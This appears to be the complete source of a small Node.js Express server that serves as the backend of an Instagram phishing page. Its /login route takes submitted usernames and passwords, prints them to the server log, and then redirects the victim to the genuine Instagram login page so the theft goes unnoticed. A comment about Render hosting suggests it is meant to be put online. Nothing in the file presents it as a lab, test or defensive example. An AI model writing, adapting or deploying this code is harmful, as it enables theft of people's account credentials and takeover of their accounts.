const express = require('express');
const path = require('path');
const app = express();

// Render assigns a port automatically; we default to 3000 for local testing
const PORT = process.env.PORT || 3000; 

// Middleware to tell the server where to find your HTML, CSS, and images
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse form data (username and password)
app.use(express.urlencoded({ extended: true }));

// **CRITICAL: The Route that Captures the Data**
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Log the credentials immediately
    console.log(`--- New Login Attempt ---`);
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log(`-------------------------`);

    // Add a slight delay to ensure the log is processed before the function exits
    setTimeout(() => {
        // Now, redirect the user
        res.redirect('https://www.instagram.com/accounts/login/');
    }, 100); // Wait 100 milliseconds
});

// Start the server listening
app.listen(PORT, () => {
    console.log(`Server running successfully on port ${PORT}`);
});